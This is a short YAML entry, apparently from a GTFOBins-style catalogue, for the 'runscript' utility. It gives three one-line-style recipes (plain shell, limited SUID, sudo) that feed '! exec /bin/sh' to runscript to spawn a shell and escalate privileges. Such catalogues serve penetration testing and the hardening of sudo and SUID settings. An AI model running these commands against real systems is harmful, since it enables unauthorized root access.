---
functions:
  shell:
    - code: |
        TF=$(mktemp)
        echo '! exec /bin/sh' >$TF
        runscript $TF
  limited-suid:
    - code: |
        TF=$(mktemp)
        echo '! exec /bin/sh' >$TF
        ./runscript $TF
  sudo:
    - code: |
        TF=$(mktemp)
        echo '! exec /bin/sh' >$TF
        sudo runscript $TF
---
